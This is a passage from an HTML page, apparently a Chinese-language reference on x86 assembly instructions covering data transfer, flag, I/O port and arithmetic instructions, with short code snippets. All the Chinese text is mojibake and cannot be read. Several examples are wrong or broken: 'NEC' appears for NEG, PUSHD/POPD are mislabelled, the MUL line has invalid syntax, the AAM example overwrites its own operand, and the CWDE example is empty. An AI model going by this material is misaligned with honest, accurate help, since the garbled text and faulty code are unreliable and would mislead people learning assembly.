è‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°ä¸ºå¯„å­˜å™¨,æ®µå¯„å­˜å™¨ä¸å¯ä½œä¸ºæ“ä½œæ•°)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">xchg ax,hxxchg ah,alxchg eax,ebxxchg var,ax;var16ä½<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CMPXCHG-æ¯”è¾ƒå¹¶äº¤æ¢æ“ä½œæ•°-ç¬¬äºŒä¸ªæ“ä½œæ•°å¿…é¡»ä¸ºç´¯åŠ å™¨AL-AX-EAX"><a href="#CMPXCHG-æ¯”è¾ƒå¹¶äº¤æ¢æ“ä½œæ•°-ç¬¬äºŒä¸ªæ“ä½œæ•°å¿…é¡»ä¸ºç´¯åŠ å™¨AL-AX-EAX" class="headerlink" title="CMPXCHG æ¯”è¾ƒå¹¶äº¤æ¢æ“ä½œæ•°( ç¬¬äºŒä¸ªæ“ä½œæ•°å¿…é¡»ä¸ºç´¯åŠ å™¨AL/AX/EAX )"></a>CMPXCHG æ¯”è¾ƒå¹¶äº¤æ¢æ“ä½œæ•°( ç¬¬äºŒä¸ªæ“ä½œæ•°å¿…é¡»ä¸ºç´¯åŠ å™¨AL/AX/EAX )</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">CMPXCHG CX,DX;å¦‚æœæŒ‡ä»¤æ‰§è¡Œå‰ (AX)=2300H,(CX)=2300H.(DX)=2400H;åˆ™æŒ‡ä»¤æ‰§è¡Œå å› ï¼ˆCXï¼‰=(AX),æ•…(CX)=2400H,ZF=1;å¦‚æœæŒ‡ä»¤æ‰§è¡Œå‰ï¼ˆAXï¼‰=2500H,(CX)=2300H,(DX)=2400H;åˆ™æŒ‡ä»¤æ‰§è¡Œåå› ï¼ˆCXï¼‰!=(AX)ï¼Œæ•…(AX)=2300Hï¼ŒZF=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XADD-å…ˆäº¤æ¢å†ç´¯åŠ -ç»“æœåœ¨ç¬¬ä¸€ä¸ªæ“ä½œæ•°é‡Œ"><a href="#XADD-å…ˆäº¤æ¢å†ç´¯åŠ -ç»“æœåœ¨ç¬¬ä¸€ä¸ªæ“ä½œæ•°é‡Œ" class="headerlink" title="XADD å…ˆäº¤æ¢å†ç´¯åŠ ( ç»“æœåœ¨ç¬¬ä¸€ä¸ªæ“ä½œæ•°é‡Œ )"></a>XADD å…ˆäº¤æ¢å†ç´¯åŠ ( ç»“æœåœ¨ç¬¬ä¸€ä¸ªæ“ä½œæ•°é‡Œ )</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">xadd eaxï¼Œecx;ç›¸å½“äºï¼šå…ˆæ‰§è¡Œï¼šxchg eax,ecxç„¶åæ‰§è¡Œï¼šadd eax,ecx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XLAT-å­—èŠ‚æŸ¥è¡¨è½¬æ¢"><a href="#XLAT-å­—èŠ‚æŸ¥è¡¨è½¬æ¢" class="headerlink" title="XLAT å­—èŠ‚æŸ¥è¡¨è½¬æ¢"></a>XLAT å­—èŠ‚æŸ¥è¡¨è½¬æ¢</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">X DW 1122h,3344h,5566h,7788hlea bx,Xmov al,03hxlat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>BX æŒ‡å‘ä¸€å¼  256 å­—èŠ‚çš„è¡¨çš„èµ·ç‚¹, AL ä¸ºè¡¨çš„ç´¢å¼•å€¼ (0-255,å³ 0-FFH); è¿”å› AL ä¸ºæŸ¥è¡¨ç»“æœ ( [BX+AL]-&gt;AL )</p><h1 id="è¾“å…¥è¾“å‡ºç«¯å£ä¼ é€æŒ‡ä»¤"><a href="#è¾“å…¥è¾“å‡ºç«¯å£ä¼ é€æŒ‡ä»¤" class="headerlink" title="è¾“å…¥è¾“å‡ºç«¯å£ä¼ é€æŒ‡ä»¤"></a>è¾“å…¥è¾“å‡ºç«¯å£ä¼ é€æŒ‡ä»¤</h1><h3 id="IN-I-Oç«¯å£è¾“å…¥"><a href="#IN-I-Oç«¯å£è¾“å…¥" class="headerlink" title="IN I/Oç«¯å£è¾“å…¥"></a>IN I/Oç«¯å£è¾“å…¥</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">è¯­æ³•: IN ç´¯åŠ å™¨, {ç«¯å£å·â”‚DX}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="OUT-I-Oç«¯å£è¾“å‡º"><a href="#OUT-I-Oç«¯å£è¾“å‡º" class="headerlink" title="OUT I/Oç«¯å£è¾“å‡º"></a>OUT I/Oç«¯å£è¾“å‡º</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">è¯­æ³•: OUT {ç«¯å£å·â”‚DX},ç´¯åŠ å™¨<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è¾“å…¥è¾“å‡ºç«¯å£ç”±ç«‹å³æ–¹å¼æŒ‡å®šæ—¶-å…¶èŒƒå›´æ˜¯-0-255-ç”±å¯„å­˜å™¨-DX-æŒ‡å®šæ—¶-å…¶èŒƒå›´æ˜¯-0-65535"><a href="#è¾“å…¥è¾“å‡ºç«¯å£ç”±ç«‹å³æ–¹å¼æŒ‡å®šæ—¶-å…¶èŒƒå›´æ˜¯-0-255-ç”±å¯„å­˜å™¨-DX-æŒ‡å®šæ—¶-å…¶èŒƒå›´æ˜¯-0-65535" class="headerlink" title="è¾“å…¥è¾“å‡ºç«¯å£ç”±ç«‹å³æ–¹å¼æŒ‡å®šæ—¶, å…¶èŒƒå›´æ˜¯ 0-255; ç”±å¯„å­˜å™¨ DX æŒ‡å®šæ—¶,å…¶èŒƒå›´æ˜¯ 0-65535"></a>è¾“å…¥è¾“å‡ºç«¯å£ç”±ç«‹å³æ–¹å¼æŒ‡å®šæ—¶, å…¶èŒƒå›´æ˜¯ 0-255; ç”±å¯„å­˜å™¨ DX æŒ‡å®šæ—¶,å…¶èŒƒå›´æ˜¯ 0-65535</h3><h1 id="ç›®çš„åœ°å€ä¼ é€æŒ‡ä»¤"><a href="#ç›®çš„åœ°å€ä¼ é€æŒ‡ä»¤" class="headerlink" title="ç›®çš„åœ°å€ä¼ é€æŒ‡ä»¤"></a>ç›®çš„åœ°å€ä¼ é€æŒ‡ä»¤</h1><h3 id="LEA-è£…å…¥æœ‰æ•ˆåœ°å€"><a href="#LEA-è£…å…¥æœ‰æ•ˆåœ°å€" class="headerlink" title="LEA è£…å…¥æœ‰æ•ˆåœ°å€"></a>LEA è£…å…¥æœ‰æ•ˆåœ°å€</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LEA DX,string ;æŠŠåç§»åœ°å€å­˜åˆ°DX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LDS-ä¼ é€ç›®æ ‡æŒ‡é’ˆ-æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥DS"><a href="#LDS-ä¼ é€ç›®æ ‡æŒ‡é’ˆ-æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥DS" class="headerlink" title="LDS ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥DS"></a>LDS ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥DS</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LDS SI,string ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°DS:SI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LES-ä¼ é€ç›®æ ‡æŒ‡é’ˆ-æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥ES"><a href="#LES-ä¼ é€ç›®æ ‡æŒ‡é’ˆ-æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥ES" class="headerlink" title="LES ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥ES"></a>LES ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥ES</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LES DI,string ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°ESDI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LFS-ä¼ é€ç›®æ ‡æŒ‡é’ˆ-æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥FS"><a href="#LFS-ä¼ é€ç›®æ ‡æŒ‡é’ˆ-æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥FS" class="headerlink" title="LFS ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥FS"></a>LFS ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥FS</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LFS DI,string ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°FSD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LGS-ä¼ é€ç›®æ ‡æŒ‡é’ˆ-æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥GS"><a href="#LGS-ä¼ é€ç›®æ ‡æŒ‡é’ˆ-æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥GS" class="headerlink" title="LGS ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥GS"></a>LGS ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥GS</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LGS DI,string ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°GSDI <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LSS-ä¼ é€ç›®æ ‡æŒ‡é’ˆ-æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥SS"><a href="#LSS-ä¼ é€ç›®æ ‡æŒ‡é’ˆ-æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥SS" class="headerlink" title="LSS ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥SS"></a>LSS ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥SS</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">LSS DI,string ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°SSDI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ ‡å¿—ä¼ é€æŒ‡ä»¤"><a href="#æ ‡å¿—ä¼ é€æŒ‡ä»¤" class="headerlink" title="æ ‡å¿—ä¼ é€æŒ‡ä»¤"></a>æ ‡å¿—ä¼ é€æŒ‡ä»¤</h1><h3 id="LAHF-æ ‡å¿—å¯„å­˜å™¨ä¼ é€-æŠŠæ ‡å¿—è£…å…¥AH"><a href="#LAHF-æ ‡å¿—å¯„å­˜å™¨ä¼ é€-æŠŠæ ‡å¿—è£…å…¥AH" class="headerlink" title="LAHF æ ‡å¿—å¯„å­˜å™¨ä¼ é€,æŠŠæ ‡å¿—è£…å…¥AH"></a>LAHF æ ‡å¿—å¯„å­˜å™¨ä¼ é€,æŠŠæ ‡å¿—è£…å…¥AH</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">.data    saveflags byte ?.code    lahf    mov saveflags,ah<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SAHF-æ ‡å¿—å¯„å­˜å™¨ä¼ é€-æŠŠAHå†…å®¹è£…å…¥æ ‡å¿—å¯„å­˜å™¨"><a href="#SAHF-æ ‡å¿—å¯„å­˜å™¨ä¼ é€-æŠŠAHå†…å®¹è£…å…¥æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="SAHF æ ‡å¿—å¯„å­˜å™¨ä¼ é€,æŠŠAHå†…å®¹è£…å…¥æ ‡å¿—å¯„å­˜å™¨"></a>SAHF æ ‡å¿—å¯„å­˜å™¨ä¼ é€,æŠŠAHå†…å®¹è£…å…¥æ ‡å¿—å¯„å­˜å™¨</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ah,saveflags    sahf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="PUSHF-æ ‡å¿—å…¥æ ˆ"><a href="#PUSHF-æ ‡å¿—å…¥æ ˆ" class="headerlink" title="PUSHF æ ‡å¿—å…¥æ ˆ"></a>PUSHF æ ‡å¿—å…¥æ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pushf;ä¿å­˜æ ‡å¿—å¯„å­˜å™¨å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POPF-æ ‡å¿—å‡ºæ ˆ"><a href="#POPF-æ ‡å¿—å‡ºæ ˆ" class="headerlink" title="POPF æ ‡å¿—å‡ºæ ˆ"></a>POPF æ ‡å¿—å‡ºæ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">popf;æ¢å¤æ ‡å¿—å¯„å­˜å™¨å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PUSHD-32ä½æ ‡å¿—å…¥æ ˆ"><a href="#PUSHD-32ä½æ ‡å¿—å…¥æ ˆ" class="headerlink" title="PUSHD 32ä½æ ‡å¿—å…¥æ ˆ"></a>PUSHD 32ä½æ ‡å¿—å…¥æ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pushd;ä¿å­˜32é€šç”¨å¯„å­˜å™¨å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POPD-32ä½æ ‡å¿—å‡ºæ ˆ"><a href="#POPD-32ä½æ ‡å¿—å‡ºæ ˆ" class="headerlink" title="POPD 32ä½æ ‡å¿—å‡ºæ ˆ"></a>POPD 32ä½æ ‡å¿—å‡ºæ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">popd;æ¢å¤32é€šç”¨å¯„å­˜å™¨å†…å­˜<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="ç®—æœ¯è¿ç®—æŒ‡ä»¤"><a href="#ç®—æœ¯è¿ç®—æŒ‡ä»¤" class="headerlink" title="ç®—æœ¯è¿ç®—æŒ‡ä»¤"></a>ç®—æœ¯è¿ç®—æŒ‡ä»¤</h1><h3 id="ADD-åŠ æ³•"><a href="#ADD-åŠ æ³•" class="headerlink" title="ADD åŠ æ³•"></a>ADD åŠ æ³•</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov eax,1add eax,12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="ADC-å¸¦è¿›ä½åŠ æ³•"><a href="#ADC-å¸¦è¿›ä½åŠ æ³•" class="headerlink" title="ADC å¸¦è¿›ä½åŠ æ³•"></a>ADC å¸¦è¿›ä½åŠ æ³•</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov dl,0mov al,0FFhadd al,0FFh;AL=FEhadc dl,0;DL/AL=01FEh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="INC-åŠ -1"><a href="#INC-åŠ -1" class="headerlink" title="INC åŠ  1"></a>INC åŠ  1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,1inc ax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="AAA-åŠ æ³•çš„ASCIIç è°ƒæ•´"><a href="#AAA-åŠ æ³•çš„ASCIIç è°ƒæ•´" class="headerlink" title="AAA åŠ æ³•çš„ASCIIç è°ƒæ•´"></a>AAA åŠ æ³•çš„ASCIIç è°ƒæ•´</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ah,0mov al,'8';AX=0038hadd al,'2';AX=006Ahaaa;AX=0100h(ç»“æœè¿›è¡ŒASCIIè½¬æ¢)or ax,3030h;AX=3130h='10'(è½¬æ¢ä¸ºASCIIç )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DAA-åŠ æ³•çš„åè¿›åˆ¶è°ƒæ•´"><a href="#DAA-åŠ æ³•çš„åè¿›åˆ¶è°ƒæ•´" class="headerlink" title="DAA åŠ æ³•çš„åè¿›åˆ¶è°ƒæ•´"></a>DAA åŠ æ³•çš„åè¿›åˆ¶è°ƒæ•´</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,35hadd al,48h;AL=7Dhdaa;AL=83h(è°ƒæ•´åç»“æœ)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="SUB-å‡æ³•"><a href="#SUB-å‡æ³•" class="headerlink" title="SUB å‡æ³•"></a>SUB å‡æ³•</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,23sub al,3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="SBB-å¸¦å€Ÿä½å‡æ³•"><a href="#SBB-å¸¦å€Ÿä½å‡æ³•" class="headerlink" title="SBB å¸¦å€Ÿä½å‡æ³•"></a>SBB å¸¦å€Ÿä½å‡æ³•</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov edx,7;é«˜32ä½mov eax,1;ä½32ä½sub eaxï¼Œ2sbb edxï¼Œ0;é«˜32ä½å‡æ³•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DEC-å‡-1"><a href="#DEC-å‡-1" class="headerlink" title="DEC å‡ 1"></a>DEC å‡ 1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">dec al<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="NEC-æ±‚å-ä»¥-0-å‡ä¹‹"><a href="#NEC-æ±‚å-ä»¥-0-å‡ä¹‹" class="headerlink" title="NEC æ±‚å(ä»¥ 0 å‡ä¹‹)"></a>NEC æ±‚å(ä»¥ 0 å‡ä¹‹)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">nec al<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CMP-æ¯”è¾ƒ-ä¸¤æ“ä½œæ•°ä½œå‡æ³•-ä»…ä¿®æ”¹æ ‡å¿—ä½-ä¸å›é€ç»“æœ"><a href="#CMP-æ¯”è¾ƒ-ä¸¤æ“ä½œæ•°ä½œå‡æ³•-ä»…ä¿®æ”¹æ ‡å¿—ä½-ä¸å›é€ç»“æœ" class="headerlink" title="CMP æ¯”è¾ƒ.(ä¸¤æ“ä½œæ•°ä½œå‡æ³•,ä»…ä¿®æ”¹æ ‡å¿—ä½,ä¸å›é€ç»“æœ)"></a>CMP æ¯”è¾ƒ.(ä¸¤æ“ä½œæ•°ä½œå‡æ³•,ä»…ä¿®æ”¹æ ‡å¿—ä½,ä¸å›é€ç»“æœ)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,5cmp ax,10;ZF=0 and CF=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="AAS-å‡æ³•çš„ASCIIç è°ƒæ•´"><a href="#AAS-å‡æ³•çš„ASCIIç è°ƒæ•´" class="headerlink" title="AAS å‡æ³•çš„ASCIIç è°ƒæ•´"></a>AAS å‡æ³•çš„ASCIIç è°ƒæ•´</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ah,0mov al,'8';AX=0038hsub al,'9';AX=00FFhaas;AX=FF09hpushfor al,30h;AX=FF39hpopf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DAS-å‡æ³•çš„åè¿›åˆ¶è°ƒæ•´"><a href="#DAS-å‡æ³•çš„åè¿›åˆ¶è°ƒæ•´" class="headerlink" title="DAS å‡æ³•çš„åè¿›åˆ¶è°ƒæ•´"></a>DAS å‡æ³•çš„åè¿›åˆ¶è°ƒæ•´</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov bl,48hmov al,85hsub al,bl;AL=3Dhdas;AL=37h(è°ƒæ•´åç»“æœ)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MUL-æ— ç¬¦å·ä¹˜æ³•"><a href="#MUL-æ— ç¬¦å·ä¹˜æ³•" class="headerlink" title="MUL æ— ç¬¦å·ä¹˜æ³•"></a>MUL æ— ç¬¦å·ä¹˜æ³•</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var word 0100hmov ax,2000h;AX=2000h;AXå­˜å‚¨ç»“æœmul 0100h/var;DX:AX=00200000h,CF=1;32ä½EDX:EAX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="IMUL-æ•´æ•°ä¹˜æ³•"><a href="#IMUL-æ•´æ•°ä¹˜æ³•" class="headerlink" title="IMUL æ•´æ•°ä¹˜æ³•"></a>IMUL æ•´æ•°ä¹˜æ³•</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,48mov bx,4imul bx;DX:AX=000000C0h,OF=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ä»¥ä¸Šä¸¤æ¡-ç»“æœå›é€AHå’ŒAL-å­—èŠ‚è¿ç®—-æˆ–DXå’ŒAX-å­—è¿ç®—"><a href="#ä»¥ä¸Šä¸¤æ¡-ç»“æœå›é€AHå’ŒAL-å­—èŠ‚è¿ç®—-æˆ–DXå’ŒAX-å­—è¿ç®—" class="headerlink" title="ä»¥ä¸Šä¸¤æ¡,ç»“æœå›é€AHå’ŒAL(å­—èŠ‚è¿ç®—),æˆ–DXå’ŒAX(å­—è¿ç®—)"></a>ä»¥ä¸Šä¸¤æ¡,ç»“æœå›é€AHå’ŒAL(å­—èŠ‚è¿ç®—),æˆ–DXå’ŒAX(å­—è¿ç®—)</h3><h3 id="AAM-ä¹˜æ³•çš„ASCIIç è°ƒæ•´"><a href="#AAM-ä¹˜æ³•çš„ASCIIç è°ƒæ•´" class="headerlink" title="AAM ä¹˜æ³•çš„ASCIIç è°ƒæ•´"></a>AAM ä¹˜æ³•çš„ASCIIç è°ƒæ•´</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var byte 05h,06hmov bl,var;ç¬¬ä¸€ä¸ªæ“ä½œæ•°mov bl,[var+1];ç¬¬äºŒä¸ªæ“ä½œæ•°mul bl;AX=001Ehaam;AX=0300h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DIV-æ— ç¬¦å·é™¤æ³•"><a href="#DIV-æ— ç¬¦å·é™¤æ³•" class="headerlink" title="DIV æ— ç¬¦å·é™¤æ³•"></a>DIV æ— ç¬¦å·é™¤æ³•</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,0083h;è¢«é™¤æ•°mov bl,2;é™¤æ•°div bl;AL=41h,AH=01h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="IDIV-æ•´æ•°é™¤æ³•"><a href="#IDIV-æ•´æ•°é™¤æ³•" class="headerlink" title="IDIV æ•´æ•°é™¤æ³•"></a>IDIV æ•´æ•°é™¤æ³•</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var sword -101;009Bhmov dx,0mov ax,var;DX:AX=0000009Bh(+155)mov bx,2;BXæ˜¯é™¤æ•°idiv bx;DX:AXé™¤ä»¥BX    var sword -48mov al,var;è¢«é™¤æ•°ä½å­—èŠ‚cbwï¼›ALæ‰©å±•åˆ°AHmov bl,+5;é™¤æ•°idiv bl;AL=-9,AH=-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä»¥ä¸Šä¸¤æ¡-ç»“æœå›é€"><a href="#ä»¥ä¸Šä¸¤æ¡-ç»“æœå›é€" class="headerlink" title="ä»¥ä¸Šä¸¤æ¡,ç»“æœå›é€:"></a>ä»¥ä¸Šä¸¤æ¡,ç»“æœå›é€:</h3><h3 id="å•†å›é€AL-ä½™æ•°å›é€AH-å­—èŠ‚è¿ç®—-æˆ–å•†å›é€AX-ä½™æ•°å›é€DX-å­—è¿ç®—"><a href="#å•†å›é€AL-ä½™æ•°å›é€AH-å­—èŠ‚è¿ç®—-æˆ–å•†å›é€AX-ä½™æ•°å›é€DX-å­—è¿ç®—" class="headerlink" title="å•†å›é€AL,ä½™æ•°å›é€AH, (å­—èŠ‚è¿ç®—);æˆ–å•†å›é€AX,ä½™æ•°å›é€DX, (å­—è¿ç®—)"></a>å•†å›é€AL,ä½™æ•°å›é€AH, (å­—èŠ‚è¿ç®—);æˆ–å•†å›é€AX,ä½™æ•°å›é€DX, (å­—è¿ç®—)</h3><h3 id="AAD-é™¤æ³•çš„ASCIIç è°ƒæ•´"><a href="#AAD-é™¤æ³•çš„ASCIIç è°ƒæ•´" class="headerlink" title="AAD é™¤æ³•çš„ASCIIç è°ƒæ•´"></a>AAD é™¤æ³•çš„ASCIIç è°ƒæ•´</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var byte ?var2 byte ?mov ax,0307h;è¢«é™¤æ•°aad;AX=0025hmov bl,5;é™¤æ•°div bl;AX=0207hmov var,almov var2,ah<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CBW-å­—èŠ‚è½¬æ¢ä¸ºå­—-æŠŠALä¸­å­—èŠ‚çš„ç¬¦å·æ‰©å±•åˆ°AHä¸­å»"><a href="#CBW-å­—èŠ‚è½¬æ¢ä¸ºå­—-æŠŠALä¸­å­—èŠ‚çš„ç¬¦å·æ‰©å±•åˆ°AHä¸­å»" class="headerlink" title="CBW å­—èŠ‚è½¬æ¢ä¸ºå­—. (æŠŠALä¸­å­—èŠ‚çš„ç¬¦å·æ‰©å±•åˆ°AHä¸­å»)"></a>CBW å­—èŠ‚è½¬æ¢ä¸ºå­—. (æŠŠALä¸­å­—èŠ‚çš„ç¬¦å·æ‰©å±•åˆ°AHä¸­å»)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var sword -101;9Bhmov al,var;AL=9Bhcbw;AL=FF9Bh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="CWD-å­—è½¬æ¢ä¸ºåŒå­—-æŠŠAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°DXä¸­å»"><a href="#CWD-å­—è½¬æ¢ä¸ºåŒå­—-æŠŠAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°DXä¸­å»" class="headerlink" title="CWD å­—è½¬æ¢ä¸ºåŒå­—. (æŠŠAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°DXä¸­å»)"></a>CWD å­—è½¬æ¢ä¸ºåŒå­—. (æŠŠAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°DXä¸­å»)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">var sword -101;FF9Bhmov ax,var;AX=FF9Bhcwd;DX:AX=FFFFFF9Bh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="CWDE-å­—è½¬æ¢ä¸ºåŒå­—-æŠŠAXä¸­çš„å­—ç¬¦å·æ‰©å±•åˆ°EAXä¸­å»"><a href="#CWDE-å­—è½¬æ¢ä¸ºåŒå­—-æŠŠAXä¸­çš„å­—ç¬¦å·æ‰©å±•åˆ°EAXä¸­å»" class="headerlink" title="CWDE å­—è½¬æ¢ä¸ºåŒå­—. (æŠŠAXä¸­çš„å­—ç¬¦å·æ‰©å±•åˆ°EAXä¸­å»)"></a>CWDE å­—è½¬æ¢ä¸ºåŒå­—. (æŠŠAXä¸­çš„å­—ç¬¦å·æ‰©å±•åˆ°EAXä¸­å»)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CDQ-åŒå­—æ‰©å±•-æŠŠEAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°EDXä¸­å»"><a href="#CDQ-åŒå­—æ‰©å±•-æŠŠEAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°EDXä¸­å»" class="headerlink" title="CDQ åŒå­—æ‰©å±•. (æŠŠEAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°EDXä¸­å»)"></a>CDQ åŒå­—æ‰©å±•. (æŠŠEAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°EDXä¸­å»)</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">var sword -101;FFFFFF9Bhmov eax,var;EDX:EAX=FFFFFFFFFFFFFF9Bhcdq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="é€»è¾‘è¿ç®—æŒ‡ä»¤"><a 